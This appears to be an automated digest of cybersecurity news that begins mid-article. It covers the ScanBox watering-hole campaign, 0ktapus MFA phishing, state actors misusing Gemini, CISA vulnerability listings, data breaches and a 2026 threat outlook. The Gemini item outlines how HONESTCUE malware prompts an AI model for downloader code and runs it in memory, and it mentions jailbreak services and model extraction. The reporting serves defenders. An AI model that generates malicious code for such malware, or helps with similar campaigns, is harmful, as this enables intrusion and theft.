MSS is the civilian intelligence, security and cyber police agency for the People’s Republic of China. It is believed responsible for counter-intelligence, foreign intelligence, political security and tied to industrial and cyber espionage efforts by China.

Dusting Off the ScanBox

The campaign leverages the ScanBox framework. ScanBox is a customizable and multifunctional Javascript-based framework used by adversaries to conducting covert reconnaissance.

ScanBox has been used by adversaries for nearly a decade and is noteworthy because criminals can use the tool to conduct counter intelligence without having to plant malware on a targets system.

“ScanBox is particularly dangerous as it doesn’t require malware to be successfully deployed to disk in order to steal information – the keylogging functionality simply requires the JavaScript code to be executed by a web browser,” according to PwC researchers referring to a previous campaign.

In lieu of malware, attackers can use ScanBox in conjunction with watering hole attacks. Adversaries load the malicious JavaScript onto a compromised website where the ScanBox acts as a keylogger snagging all of a user’s typed activity on the infected watering hole website.

TA423’s attacks began with phishing emails, with such titles as “Sick Leave,” “User Research” and “Request Cooperation.” Often, the emails purported to come from an employee of the “Australian Morning News,” a fictional organization. The employee implored targets to visit their “humble news website,” australianmorningnews[.]com.

“Upon clicking the link and redirecting to the site, visitors were served the ScanBox framework,” researchers wrote.

The link directed targets to a web page with content copied from actual news sites, like the BBC and Sky News. In the process, it also delivered the ScanBox malware framework.

ScanBox keylogger data culled from waterholes is part of a multi-stage attack, giving attackers insight into the potential targets that will help them launch future attacks against them. This technique is often called browser fingerprinting.

The primary, initial script sources a list of information about the target computer, including the operating system, language and version of Adobe Flash installed. ScanBox additionally runs a check for browser extensions, plugins and components such WebRTC.

“The module implements WebRTC, a free and open-source technology supported on all major browsers, which allows web browsers and mobile applications to perform real-time communication (RTC) over application programming interfaces (APIs). This allows ScanBox to connect to a set of pre-configured targets,” researchers explain.

Adversaries can then leverage a technology called STUN (Session Traversal Utilities for NAT). This is a standardized set of methods, including a network protocol, that allows interactive communications (including real-time voice, video, and messaging applications) to traverse network address translator (NAT) gateways, researchers explain.

“STUN is supported by the WebRTC protocol. Through a third-party STUN server located on the Internet, it allows hosts to discover the presence of a NAT, and to discover the mapped IP address and port number that the NAT has allocated for the application’s User Datagram Protocol (UDP) flows to remote hosts. ScanBox implements NAT traversal using STUN servers as part of Interactive Connectivity Establishment (ICE), a peer-to-peer communication method used for clients to communicate as directly as possible, avoiding having to communicate through NATs, firewalls, or other solutions,” according to researchers.

“This means that the ScanBox module can set up ICE communications to STUN servers, and communicate with victim machines even if they are behind NAT,” they explain.

The threat actors “support the Chinese government in matters related to the South China Sea, including during the recent tensions in Taiwan,” Sherrod DeGrippo, vice president of threat research and detection at Proofpoint, explained in a statement, “This group specifically wants to know who is active in the region and, while we can’t say for certain, their focus on naval issues is likely to remain a constant priority in places like Malaysia, Singapore, Taiwan, and Australia.”

The group has, in the past, expanded well beyond Australasia. According to a Department of Justice indictment from July, 2021, the group has “stolen trade secrets and confidential business information” from victims in “the United States, Austria, Cambodia, Canada, Germany, Indonesia, Malaysia, Norway, Saudi Arabia, South Africa, Switzerland and the United Kingdom. Targeted industries included, among others, aviation, defense, education, government, health care, biopharmaceutical and maritime.”

Despite the DoJ indictment, analysts “have not observed a distinct disruption of operational tempo” from TA423, and they “collectively expect TA423 / Red Ladon to continue pursuing its intelligence-gathering and espionage mission.”

[12] Threatpost - Tentacles of ‘0ktapus’ Threat Group Victimize 130 Firms
────────────────────────────────────────────────────────────────────────────────
Tarih: Mon, 29 Aug 2022 14:56:19 +0000
Link: https://threatpost.com/0ktapus-victimize-130-firms/180487/

[TAM METİN - 614 kelime]
Over 130 companies tangled in sprawling phishing campaign that spoofed a multi-factor authentication system.

Targeted attacks on Twilio and Cloudflare employees are tied to a massive phishing campaign that resulted in 9,931 accounts at over 130 organizations being compromised. The campaigns are tied to focused abuse of identity and access management firm Okta, which gained the threat actors the 0ktapus moniker, by researchers.

“The primary goal of the threat actors was to obtain Okta identity credentials and multi-factor authentication (MFA) codes from users of the targeted organizations,” wrote Group-IB researchers in a recent report. “These users received text messages containing links to phishing sites that mimicked the Okta authentication page of their organization.”

Impacted were 114 US-based firms, with additional victims of sprinkled across 68 additional countries.

Roberto Martinez, senior threat intelligence analyst at Group-IB, said the scope of the attacks is still an unknown. “The 0ktapus campaign has been incredibly successful, and the full scale of it may not be known for some time,” he said.

What the 0ktapus Hackers Wanted

The 0ktapus attackers are believed to have begun their campaign by targeting telecommunications companies in hopes of winning access to potential targets’ phone numbers.

While unsure exactly how threat actors obtained a list of phone numbers used in MFA-related attacks, one theory researchers posit is that 0ktapus attackers began their campaign targeting telecommunications companies.

“[A]ccording to the compromised data analyzed by Group-IB, the threat actors started their attacks by targeting mobile operators and telecommunications companies and could have collected the numbers from those initial attacks,” researchers wrote.

Next, attackers sent phishing links to targets via text messages. Those links led to webpages mimicking the Okta authentication page used by the target’s employer. Victims were then asked to submit Okta identity credentials in addition to a multi-factor authentication (MFA) codes employees used to secure their logins.

In an accompanying technical blog, researchers at Group-IB explain that the initial compromises of mostly software-as-a-service firms were a phase-one in a multi-pronged attack. 0ktapus’ ultimate goal was to access company mailing lists or customer-facing systems in hopes of facilitating supply-chain attacks.

In a possible related incident, within hours of Group-IB publishing its report late last week, the firm DoorDash revealed it was targeted in an attack with all the hallmarks of an 0ktapus-style attack.

Blast Radius: MFA Attacks

In a blog post DoorDash revealed; “unauthorized party used the stolen credentials of vendor employees to gain access to some of our internal tools.” The attackers, according to the post, went on to steal personal information – including names, phone numbers, email and delivery addresses – from customers and delivery people.

In the course of its campaign, the attacker compromised 5,441 MFA codes, Group-IB reported.

“Security measures such as MFA can appear secure… but it is clear that attackers can overcome them with relatively simple tools,” researchers wrote.

“This is yet another phishing attack showing how easy it is for adversaries to bypass supposedly secure multifactor authentication,” Roger Grimes, data-driven defense evangelist at KnowBe4, wrote in a statement via email. “It simply does no good to move users from easily phish-able passwords to easily phish-able MFA. It’s a lot of hard work, resources, time, and money, not to get any benefit.”

To mitigate 0ktapus-style campaigns, the researchers recommended good hygiene around URLs and passwords, and using FIDO2-compliant security keys for MFA.

“Whatever MFA someone uses,” Grimes advised, “the user should be taught about the common types of attacks that are committed against their form of MFA, how to recognize those attacks, and how to respond. We do the same when we tell users to pick passwords but don’t when we tell them to use supposedly more secure MFA.”

[13] Security Affairs - Google: state-backed hackers exploit Gemini AI for cyber recon and attacks
────────────────────────────────────────────────────────────────────────────────

[TAM METİN - 639 kelime]
Google DeepMind and GTIG report a rise in model extraction or “distillation” attacks aimed at stealing AI intellectual property, which Google has detected and blocked. While APT groups have not breached frontier models, private firms and researchers have tried to clone proprietary systems. State-backed actors from North Korea, Iran, China, and Russia use AI for research, targeting, and phishing. Threat actors also test agentic AI, AI-powered malware like HONESTCUE, and underground “jailbreak” services.

Threat actors now use large language models to craft polished, culturally accurate phishing messages that remove common red flags like poor grammar. They also run “rapport-building” phishing, holding realistic multi-step conversations to gain trust before delivering malware.

Google reported that North Korea-linked hacker group UNC2970 used its Gemini AI model to gather intelligence on targets and support cyber operations. The company also said other threat groups now weaponize generative AI to speed up attack stages, run information operations, and even attempt model extraction attacks.

“The North Korean government-backed actor UNC2970 has consistently focused on defense targeting and impersonating corporate recruiters in their campaigns. The group used Gemini to synthesize OSINT and profile high-value targets to support campaign planning and reconnaissance.” reads the report published by Google. “This actor’s target profiling included searching for information on major cybersecurity and defense companies and mapping specific technical job roles and salary information. “

Iran-linked group APT42 also used generative AI tools like Gemini to boost reconnaissance and targeted social engineering. The group searched for official email addresses, researched organizations to build believable pretexts, and created tailored personas based on target biographies. The nation-state actor also used AI for language translation and understanding local context. Google disrupted the activity and disabled related assets.

In September 2025, Google tracked new malware called HONESTCUE that uses the Gemini API to generate malicious C# code on demand. Instead of storing full payloads, the malware sends prompts to Gemini, receives source code for a second-stage downloader, compiles it in memory with .NET tools, and executes it without writing files to disk. This fileless approach helps evade detection. Attackers also host payloads on platforms like Discord CDN. Researchers believe a single actor or small group is testing this AI-assisted malware as a proof of concept.

In November 2025, GTIG found COINBAIT, a phishing kit built with help from AI. It pretends to be a major crypto exchange to steal login details. Some of the activity links to UNC5356, a group known for SMS and phone phishing. The kit was likely created using Lovable AI and built as a complex React website. It includes detailed “? Analytics:” logs that show how it tracks and steals data. The attackers hid their systems behind Cloudflare and trusted services to avoid detection. COINBAIT shows a move toward modern web tools and cloud services, may be used by different groups, and also connects to AI-hosted ClickFix scams that trick users into installing malware like ATOMIC.

Underground forums show strong demand for AI tools built for cybercrime. Since most threat actors cannot build their own models, they rely on established services like Gemini. One example, Xanthorox, claimed to be a private custom AI for malware and phishing, but it actually ran on commercial and open-source AI tools layered together.

Attackers need stolen API keys to scale abuse, creating risks for organizations using cloud AI services. Criminals often exploit weak security in open-source AI platforms to steal and resell API keys, fueling a black market.

Google disabled accounts linked to this abuse and continues strengthening safeguards, threat detection, red teaming, and secure AI development through frameworks like SAIF and research projects such as Big Sleep and CodeMender.

“The potential of AI, especially generative AI, is immense. As innovation moves forward, the industry needs security standards for building and deploying AI responsibly.” concludes Google.

[TAM METİN - 358 kelime]
The U.S. Cybersecurity and Infrastructure Security Agency (CISA) added SolarWinds Web Help Desk, Notepad++, Microsoft Configuration Manager, and Apple devices flaws to its Known Exploited Vulnerabilities (KEV) catalog.

The first flaw added to the catalog is a Microsoft Configuration Manager SQL Injection Vulnerability tracked as CVE-2024-43468. An unauthenticated attacker could send specially crafted requests to the system and trigger unsafe processing, allowing them to execute commands on the server or underlying database.

The second flaw added to the catalog is a Notepad++ Download of Code Without Integrity Check tracked as CVE-2025-15556. Vulnerability. Notepad++ versions before 8.8.9 using WinGUp have a flaw where updates aren’t verified. An attacker intercepting update traffic can make the updater run a malicious installer, allowing arbitrary code execution with the user’s privileges.

The third flaw added to the catalog is a security control bypass vulnerability, tracked as CVE-2025-40536, that could allow an unauthenticated attacker to access certain restricted functionality within Web Help Desk. While more limited in scope than the critical flaws, successful exploitation could still expose sensitive features and weaken the application’s overall security posture.

The last flaw added to the catalog is an Apple Multiple Buffer Overflow Vulnerability tracked as CVE-2026-20700.

This week, Apple released updates for iOS, iPadOS, macOS, watchOS, tvOS, and visionOS to address an actively exploited zero-day tracked as CVE-2026-20700. The flaw is a memory corruption issue in Apple’s Dynamic Link Editor (dyld) that lets attackers execute arbitrary code on vulnerable devices.

Google’s Threat Analysis Group discovered and reported the issue, a circumstance that suggests the flaw may have been exploited by nation-state actors or commercial spyware vendors in attacks in the wild.

According to Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities, FCEB agencies have to address the identified vulnerabilities by the due date to protect their networks against attacks exploiting the flaws in the catalog.

Experts also recommend that private organizations review the Catalog and address the vulnerabilities in their infrastructure.

CISA orders federal agencies to fix the vulnerabilities by March 5, 2026, except CVE-2025-40536, which must be solved by February 15, 2026.

Hackers broke into Dutch telecom firm Odido and accessed data from 6.2 million accounts. The company confirmed the breach and said attackers took names, addresses, phone numbers, email addresses, bank account details, dates of birth, and passport or ID numbers.

“Odido has been hit by a cyberattack, which compromised customer data. This involved personal data from a customer contact system used by Odido. No passwords, call logs, or billing information were affected.” reads a notice published by the company on its website. “The unauthorized access to the system was terminated as quickly as possible. Odido also engaged external cybersecurity experts to assist with implementing additional security measures as part of the incident response.”

The telco said the breach did not expose My Odido account passwords, call records, location data, invoice details, or scans of ID documents.

Odido’s subsidiary Ben also warned its customers that hackers may have stolen their information.

Odido is a Dutch telecommunications company and one of the largest mobile network operators in the Netherlands. It was formed when T-Mobile Netherlands and Tele2 were rebranded as Odido in 2023 after private equity firms Apax Partners and Warburg Pincus acquired the business.

Odido serves around 8 million mobile subscribers and about 1 million fixed broadband customers nationwide. The company provides mobile telephony, wireless broadband, and related services under multiple brands including Odido, Ben, and Simpel.

Financially, Odido generates around €2 billion in annual revenue, with growth in consumer broadband and business mobile services contributing to its topline

The telco discovered the hack last weekend and reported it to the Dutch privacy watchdog. The company said it quickly stopped the unauthorized access and brought in cybersecurity experts to strengthen its defenses.

“The unauthorised access to the system was ended as quickly as possible,” the company said in a statement. “In addition, Odido has brought in cybersecurity experts to implement additional security measures in response to this incident.”

The company urges customers to stay alert for suspicious activity. Criminals may use stolen details to pose as Odido, banks, or other companies through calls, texts, or emails. Avoid clicking unknown links and check senders carefully. Verify unexpected calls by contacting the company directly using official numbers. Never share passwords or PINs. Review invoices closely, as scammers may send fake payment requests. When in doubt, check your account or contact customer support.

The company did not disclose technical details about the attack.

[17] Graham Cluley - Polish hacker charged seven years after massive Morele.net data breach

[TAM METİN - 409 kelime]
A 29-year-old Polish man has been charged in connection with a data breach that exposed the personal details of around 2.5 million customers of the popular Polish e-commerce website Morele.net.

Poland's Central Cybercrime Bureau (CBZC) announced that charges were filed on 30 January 2026, following years of investigation into the 2018 breach of Morele.net, that specialises in electronics, computer equipment and home appliances.

The high-profile breach of Morele.net, whose international equivalents include the likes of Best Buy, Newegg, and Amazon, sent shockwaves through Poland's online retail sector.

The investigation into the data breach had originally been shelved after police failed to identify a suspect, but authorities claim that the trail never went entirely cold.

Over time investigators identified the attack vector, reconstructed the sequence of events, and traced digital breadcrumbs back to the alleged hacker - demonstrating their determination in a YouTube video.

According to a CBZC press release, the suspect has admitted responsibility for the hack.

The cyber attack exposed names, email addresses, phone numbers, home addresses, and md5crypt-hashed passwords. Although payment card details were not compromised in the breach, it was reported that some 35,000 customers did have particularly sensitive information stolen, including national ID numbers, financial details, education information, income, and marital status.

Morele.net refused to pay a ransom, and the breached database was published online.

Unfortunately for the site's users who had their information breached, fraudsters weaponised the stolen data immediately. Victims reported receiving SMS messages demanding payment of 1 Polish zloty to "complete" their orders, accompanied by phishing links that stole banking credentials.

In 2019, in what was one of the country's largest GDPR-related fines at the time, Poland's data protection authority regulator hit Morele.net to the tune of €645,000, claiming that had failed to detect and respond to unusual network traffic.

Morele.net contested the fine, arguing that its security measures were reasonable even if they ultimately proved insufficient against a determined attacker, and eventually Poland's Supreme Administrative Court annulled the penalty, saying it had finding deficiencies in the regulator's justification and calculation of the fine.

Now, however, it is the alleged hacker who will be hoping he can escape receiving a heavy punishment.

If anything, this case serves as a timely reminder to cybercriminals that they should not assume that they have evaded justice just because years have passed since their offence. Digital forensics techniques continue to improve, and law enforcement agencies are increasingly willing to pursue cold cases when new leads emerge.

AI bots are having existential crises, inventing religions, and allegedly plotting against humanity… or so the internet would have you believe.

We dig into Moltbook, the “AI-only” social network that sent Twitter into a meltdown, attracted breathless talk of the singularity, and turned out to be far less Terminator and far more humans role-playing as bots.

Plus we discuss why “vibe coding” your app might be a catastrophically bad idea, when security researchers can easily peek inside rifle through your private messages, API keys, and databases.

Also this week we learn that pro-Russian hackers are circling the Winter Olympics – or is it the Jamaican Bobsleigh team?

All this and more is discussed in episode 454 of the “Smashing Security” podcast with cybersecurity veteran Graham Cluley, and special guest Iain Thomson.

[19] SANS ISC - AI-Powered Knowledge Graph Generator &#x26; APTs, (Thu, Feb 12th)

AI-Powered Knowledge Graph Generator & APTs

Unstructured text to interactive knowledge graph via LLM & SPO triplet extraction

Courtesy of TLDR InfoSec Launches & Tools again, another fine discovery in Robert McDermott’s AI Powered Knowledge Graph Generator. Robert’s system takes unstructured text, uses your preferred LLM and extracts knowledge in the form of Subject-Predicate-Object (SPO) triplets, then visualizes the relationships as an interactive knowledge graph.[1]

Robert has documented AI Powered Knowledge Graph Generator (AIKG) beautifully, I’ll not be regurgitating it needlessly, so please read further for details regarding features, requirements, configuration, and options. I will detail a few installation insights that got me up and running quickly.
The feature summary is this:
AIKG automatically splits large documents into manageable chunks for processing and uses AI to identify entities and their relationships. As AIKG ensures consistent entity naming across document chunks, it discovers additional relationships between disconnected parts of the graph, then creates an interactive graph visualization. AIKG works with any OpenAI-compatible API endpoint; I used Ollama exclusively here with Google’s Gemma 3, a lightweight family of models built on Gemini technology. Gemma 3 is multimodal, processing text and images, and is the current, most capable model that runs on a single GPU. I ran my experimemts on a Lenovo ThinkBook 14 G4 circa 2022 with an AMD Ryzen 7 5825U 8-core processor, Radeon Graphics, and 40gb memory running Ubuntu 24.04.3 LTS.
My installation guidelines assume you have a full instance of Python3 and Ollama installed. My installation was implemented under my tools directory.

I opted to test AIKG via a couple of articles specific to Russian state-sponsored adversarial cyber campaigns as input:

CISA’s Cybersecurity Advisory Russian GRU Targeting Western Logistics Entities and Technology Companies May 2025

SecurityWeek’s Russia’s APT28 Targeting Energy Research, Defense Collaboration Entities January 2026

My use of these articles in particular was based on the assertion that APT and nation state activity is often well represented via interactive knowledge graph. I’ve advocated endlessly for visual link analysis and graph tech, including Maltego (the OG of knowledge graph tools) at far back as 2009, Graphviz in 2015, GraphFrames in 2018 and Beagle in 2019. As always, visualization, coupled with entity relationship mappings, are an imperative for security analysts, threat hunters, and any security professional seeking deeper and more meaningful insights. While the SecurityWeek piece is a bit light on content and density, it served well as a good initial experiment.
The CISA advisory is much more dense and served as an excellent, more extensive experiment.
I pulled them both into individual text files more easily ingested for processing with AIKG, shared for you here if you’d like to play along at home.

Starting with SecurityWeek’s Russia’s APT28 Targeting Energy Research, Defense Collaboration Entities, and the subsequent Russia-APT28-targeting.txt file I created for model ingestion, I ran Gemma 3 as a 12 billion parameter model as follows:

You may want or need to run Gemma 3 with fewer parameters depending on the performance and capabilities of your local system. Note that I am calling file paths rather explicitly to overcome complaints about missing config and input files.
The article makes reference to APT credential harvesting activity targeting people associated with a Turkish energy and nuclear research agency, as well as a spoofed OWA login portal containing Turkish-language text to target Turkish scientists and researchers. As part of it’s use of semantic triples (Subject-Predicate-Object (SPO) triplets), how does AIKG perform linking entities, attributes and values into machine readable statements [2] derived from the article content, as seen in Figure 1?

Figure 1: AIKG Gemma 3:12b result from SecurityWeek article

Quite well, I’d say. To manipulate the graph, you may opt to disable physics in the graph output toolbar so you can tweak node placements. As drawn from the statistics view for this graph, AIKG generated 38 nodes, 105 edges, 52 extracted edges, 53 inferred edges, and four communities. You can further filter as you see fit, but even unfiltered, and with just a little by of tuning at the presentation layer, we can immediately see success where semantic triples immediately emerge to excellent effect. We can see entity/relationship connections where, as an example, threat actor –> targeted –> people and people –> associated with –> think tanks, with direct reference to the aforementioned OWA portal and Turkish language. If you’re a cyberthreat intelligence analyst (CTI) or investigator, drawing visual conclusions derived from text processing will really help you step up your game in the form of context and enrichment in report writing. This same graph extends itself to represent the connection between the victims and the exploitation methods and infrastructure. If you don’t want to go through a full installation process for yourself to complete your own model execution, you should still grab the JSON and HTML output files and experiment with them in your browser. You’ll get a real sense of the power and impact of an interactive knowledge graph with the joint forces power of LLM and SPO triplets.
For a second experiment I selected related content in a longer, more in depth analysis courtesy of a CISA Cybersecurity Advisory (CISA friends, I’m pulling for you in tough times). If you are following along at home, be sure to exit ollama so you can rerun it with additional parameters (27b vs 12b); pass /bye as a message, and restart:

Given the density and length of this article, the graph as initially rendered is a bit untenable (no fault of AIKG) and requires some tuning and filtering for optimal effect. Graph Statistics for this experiment included 118 nodes, 486 edges, 152 extracted edges, 334 inferred edges, and seven communities. To filter, with a focus again on actions taken by Russian APT operatives, I chose as follows:

Select a Node by ID: threat actors

Select a network item: Nodes

Select a property: color

Select value(s): #e41a1c (red)

The result is more visually feasible, and allows ready tweaking to optimize network connections, as seen in Figure 2.

Figure 2: AIKG Gemma 3:27b result from CISA advisory

Shocking absolutely no one, we immediately encapsulate actor activity specific to credential access and influence operations via shell commands, Active Directory commands, and PowerShell commands. The conclusive connection is drawn however as threat actors –> targets –> defense industry. Ya think? ;-) In the advisory, see Description of Targets, including defense industry, as well as Initial Access TTPs, including credential guessing and brute force, and finally Post-Compromise TTPs and Exfiltration regarding various shell and AD commands. As a security professional reading this treatise, its reasonable to assume you’ve read a CISA Cybersecurity Advisory before. As such, its also reasonable to assume you’ll agree that knowledge graph generation from a highly dense, content rich collection of IOCs and behaviors is highly useful. I intend to work with my workplace ML team to further incorporate the principles explored herein as part of our context and enrichment generation practices. I suggest you consider the same if you have the opportunity. While SPO triplets, aka semantic triples, are most often associated with search engine optimization (SEO), their use, coupled with LLM power, really shines for threat intelligence applications.

Cheers…until next time.

2026 State of Security

Explore the intelligence from Recorded Future's Insikt Group annual threat landscape analysis: the definitive report on how geopolitical fragmentation, state-sponsored operations, and criminal ecosystem evolution are reshaping global risk.

Fragmentation is the new normal

The global threat landscape didn't simplify in 2025—it shattered. Geopolitical alliances strained. Criminal enterprises splintered and regrouped. State-sponsored actors shifted from dramatic disruptions to quiet pre-positioning. And as long-established norms unwound, convergence across once-distinct domains created unprecedented uncertainty.

The 2026 State of Security report delivers Insikt Group's most comprehensive annual analysis of the forces shaping global security—helping leaders reduce surprise, prioritize effectively, and act with confidence.

2025: A year of fragmentation

Geopolitical tensions dominate

Russia-Ukraine War Enters Fourth Year | Geopolitical

India-Pakistan Ballistic Missile Exchanges | Geopolitical

US-Brokered Ceasefire Prevents Escalation | Geopolitical

State-sponsored attacks

Israel-Iran Twelve-Day Conflict | Geopolitical

RedMike Campaign Targets Telecom Infrastructure | State-Sponsored

Chinese Actors Exploit Unpatched Cisco Devices Across 100+ Countries | State-Sponsored

Geopolitical threats and deepfakes

Thailand-Cambodia Border Clashes | Geopolitical

Russian GRU Operations Intensify Against NATO Infrastructure | State-Sponsored

Deepfake-Enabled Fraud Increases 10x Since 2024 | Emerging Technology

289 New Ransomware Variants Identified (33% YoY Increase) | Cybercrime

Synthetic Identity Fraud Up 300% | Emerging Technology

Law Enforcement Disruptions Fragment Criminal Ecosystems | Cybercrime

The converging threat landscape

Risk moves to the edges

China, Russia, Iran, and North Korea focused not on dramatic attacks but on covert accumulation of access—targeting identity systems, cloud environments, and edge infrastructure where oversight is weakest. The primary risk is no longer a single large-scale incident. It's sustained pre-positioning that enables persistent espionage and creates latent capacity for disruption.

Key Insight: Warning timelines are compressing. The adversaries are already inside.

Convergence across domains

Every major conflict in 2025 had a digital front—and the combatants weren't always who they claimed to be. Genuine intrusions, exaggerated claims, and disinformation reinforced one another across Israel-Iran, India-Pakistan, Thailand-Cambodia, and Russia-Ukraine conflicts.

Key Insight: Perception is now contested terrain. Even low-sophistication attacks generate outsized impact when amplified through coordinated information operations.

Fragmented, modular, resilient

Law enforcement achieved significant wins in 2025. But the criminal ecosystem adapted. Sustained pressure fractured large enterprises into smaller, decentralized operations. Groups adopted subscription models, outsourced operations, and relied on specialized services—creating a distributed criminal supply chain that's resilient and difficult to track.

Key Insight: Threat actors are adapting faster than defenses. Modular ecosystems mean even disrupted operations reconstitute rapidly.

Verification failure at scale

2025 was not a breakout year for AI-driven cyber operations. But the immediate risk isn't autonomous attacks—it's verification failure at scale, where deception becomes faster, cheaper, and more convincing. As AI becomes empowered to take real-world actions through autonomous agents, the attack surface for fraud and manipulation will expand dramatically.

Key Insight: Organizations that act now to establish AI governance and prepare for post-quantum migration will hold significant advantages.

What 2025 teaches us about 2026

[23] Recorded Future - Fragmentation Defined 2025's Threat Landscape. Here's What It Means for 2026

Fragmentation Defined 2025's Threat Landscape. Here's What It Means for 2026

Uncertainty has become the operating environment for business. And this year, fragmentation is driving it.

The global threat landscape didn't simplify in 2025; it shattered. Geopolitical alliances strained. Criminal enterprises splintered under law enforcement pressure, then regrouped into smaller, faster, and harder-to-track operations. State-sponsored cyber actors shifted from dramatic disruptions to quiet pre-positioning, embedding themselves in networks and waiting. Hacktivist groups and influence networks amplified conflicts, blurring the line between genuine intrusions and perception warfare.

But here's what makes this moment dangerous: as long-established norms unwind, fragmentation is paradoxically enabling greater interoperability across domains that were once distinct. State objectives, criminal capability, and private-sector technology increasingly reinforce one another. That convergence creates uncertainty, compresses warning time, and expands plausible deniability.

Today, Recorded Future's Insikt Group releases the 2026 State of Security report, our most comprehensive annual analysis of the forces shaping global security.

Drawing on proprietary intelligence, network telemetry, and deep geopolitical analysis, this report examines how 2025's fractures are reshaping the threat environment — and what security leaders must prepare for in the year ahead.

The End of Stability as a Baseline Assumption

For decades, organizations built risk models around a core premise: that the international order would hold, diplomatic mechanisms would constrain escalation, and major powers would avoid direct confrontation.

That premise no longer applies.

In 2025, the international geopolitical order fragmented as hard-power competition, transactional diplomacy, and the testing of red lines became defining features of state behavior. The Russia–Ukraine war ground into its fourth year, with Moscow maintaining a strategic advantage despite minimal territorial gains. Israel and Iran clashed directly in a twelve-day conflict that reshaped regional power dynamics. India and Pakistan escalated to ballistic missile exchanges before a US-brokered ceasefire intervened. Thailand and Cambodia exchanged fire along disputed borders, triggering the most intense fighting in nearly fifteen years.

The pattern is clear: states are increasingly willing to use force to advance objectives when diplomatic mechanisms appear unreliable. As modern power struggles threaten institutions like international law, risk is spreading across domains that have historically had clearer boundaries.

For organizations, this means geopolitical crises are increasingly likely to spill over into corporate networks, supply chains, regulatory environments, and digital infrastructure with limited warning. Resilience, not stability, became the baseline operating assumption.

State-Sponsored Actors: Risk Moves to the Edges

While kinetic conflicts dominated headlines, some of 2025's most consequential state-sponsored activity unfolded quietly in digital environments — at the edges of networks where oversight is weakest.

China, Russia, Iran, and North Korea, also known as the four most capable and consistently active hostile state cyber actors Insikt Group tracks, focused not on dramatic attacks but on the covert accumulation of access. They targeted identity systems, cloud environments, and edge infrastructure: the poorly monitored network devices, VPN appliances, and perimeter systems that organizations struggle to patch and defend.

Insikt Group's reporting on RedMike highlighted disciplined pre-positioning in telecommunications infrastructure: access built selectively and held quietly for intelligence value by threat actors ready to pivot quickly when timing and pressure align. Chinese state-sponsored actors targeted telecommunications providers worldwide, with one campaign exploiting unpatched Cisco devices across more than 100 countries. Russian GRU-linked groups intensified operations against critical infrastructure in Ukraine and NATO member states. Iranian operators blended espionage with hack-and-leak campaigns. North Korean actors merged revenue generation with espionage, deploying fraudulent IT workers embedded in foreign companies as an access vector.

The strategic shift is profound: the primary risk is no longer a single, large-scale cyber incident. It's sustained pre-positioning that enables persistent espionage in peacetime and creates latent capacity for disruption during crises. Warning timelines are compressing, as the adversaries are already inside.

Hacktivists and Influence Operators: Convergence Across Domains

Every major conflict in 2025 had a digital front, and unsurprisingly, the combatants weren't always who they claimed to be.

Hacktivist groups, patriotic volunteers, and influence networks played growing roles in conflicts involving Israel–Iran, India–Pakistan, Thailand–Cambodia, and Russia–Ukraine. These actors operated with varying degrees of state alignment but consistently contributed to a threat landscape where genuine intrusions, exaggerated claims, and disinformation reinforced one another.

Regional escalation involving Israel and Iran showed how cyber operations, influence campaigns, and commercial surveillance tools can operate alongside military force, as domains converge in ways that would have seemed implausible just years ago. During the India–Pakistan escalation, both sides deployed large-scale influence networks that spread coordinated narratives, forged military documents, and amplified hacktivist claims of grid disruptions. Russian-aligned hacktivists targeted NATO countries with DDoS campaigns, with investigations revealing that portions of this "hacktivist" ecosystem function as state-directed fronts.

The implication for defenders: perception is now contested terrain. Even low-sophistication attacks can generate outsized reputational and psychological impact when amplified through coordinated information operations.

Cybercrime: Fragmented, Modular, Resilient

Law enforcement achieved significant wins against cybercriminal infrastructure in 2025. Forum takedowns, arrests, and sanctions disrupted major operations. Ransomware payments declined for the second consecutive year.

But the criminal ecosystem just adapted to these new conditions.

Sustained pressure fractured large criminal enterprises into smaller, more decentralized operations. Insikt Group identified 289 new ransomware variants this year (a 33% increase from 2024), most of which were derived from leaked source code. Groups adopted subscription models, outsourced operations, and relied on specialized services for laundering and negotiation. The result: a distributed criminal supply chain that's resilient, decentralized, and increasingly difficult to track.

Cybercrime groups increasingly aligned with national strategic objectives, blurring the boundaries between criminal and state activity. In Venezuela, state action eroded legal, political, and cyber boundaries, challenging assumptions about sovereignty and accountability. Mercenary spyware pursued the same persistent-access goals as state actors, embedding where oversight was weakest and adapting under pressure.

English-speaking criminal actors, such as the Scattered LAPSUS$ Hunters collective, demonstrated that low-tech social engineering tactics — particularly help desk impersonation — remain devastatingly effective. Meanwhile, organized crime in Southeast Asia industrialized fraud at an unprecedented scale, with Chinese-speaking transnational criminal organizations running call center compounds using coerced labor augmented by AI-driven automation.

For organizations, the takeaway is stark: threat actors are adapting faster than defenders. Modular criminal ecosystems that share tools, infrastructure, and access can reconstitute rapidly even after disruptions.

Emerging Technologies: Verification Failure at Scale

2025 was not a breakout year for AI-driven cyber operations.

To separate hype from signal, Insikt Group developed AIM3 — our framework for assessing AI malware maturity. It shows that most observed use remains at an early stage of development. Threat actors experimented with malicious AI models tailored for cyber operations, but the results were incremental rather than transformative.

The immediate risk is not autonomous attacks. It's verification failure at scale, where deception becomes faster, cheaper, and more convincing as AI is embedded into decision workflows.

Deepfake-enabled fraud has increased more than tenfold since the start of 2024. Synthetic identity fraud rose 300% in Q1 2025 alone. Adversaries began testing prompt injection attacks and "generated-SEO" manipulation to poison AI search results. As AI becomes empowered to take real-world actions through autonomous agents, the attack surface for fraud and manipulation will expand dramatically.

At the strategic level, the US–China race for AI dominance intensified, with China pursuing an aggressive diffusion strategy that's embedding Chinese LLMs into the global software ecosystem. Competition over quantum computing, advanced robotics, and space systems is extending beyond commercial markets into sustained geopolitical rivalry.

The organizations that act now to establish AI governance, inventory cryptographic dependencies, and prepare for post-quantum migration will hold significant advantages as these technologies mature.

What 2025 Teaches Us About 2026

Looking ahead, diplomatic friction, selective enforcement of norms, and accelerating technology adoption will continue to widen the gap between how risk is assumed to behave and how it actually behaves.

The patterns of 2025 point toward a 2026 threat environment defined by sustained uncertainty:

Simultaneous regional crises will become the norm. As enforcement of established norms becomes more selective, regional and emerging powers will pursue objectives more aggressively, and external intervention in internal conflicts will expand.

Connectivity disruptions will emerge as a primary tool of coercion. Undersea cables, satellite systems, and positioning/navigation/timing infrastructure are becoming strategic targets, with even limited interference capable of cascading across critical sectors.

Ransomware will fragment further. Declining payments will push threat actors toward shorter attack cycles, lower demands, and disruption-focused tactics designed to compel engagement.

The synthetic identity crisis will deepen. AI-enabled deepfakes and compromised identity verification systems will make business email compromise and social engineering more convincing and scalable.

